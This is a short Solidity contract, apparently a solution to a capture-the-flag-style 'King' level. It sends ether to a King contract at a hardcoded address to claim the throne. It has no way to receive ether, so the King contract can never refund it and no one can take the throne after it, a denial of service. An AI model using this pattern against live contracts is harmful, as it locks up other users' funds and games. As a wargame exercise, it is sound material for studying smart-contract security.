pragma solidity ^0.6.0;

import "./default.sol";

contract BadKing {
    King public king = King(0x4047A8083f3e637C795d6a649087CDE96a8d092e);
    uint256 public sending = 0;

    constructor() public payable {
        sending += msg.value;
    }

    function becomeKing() public payable {
        address(king).call{value: sending, gas: 4000000}("");
    }
}
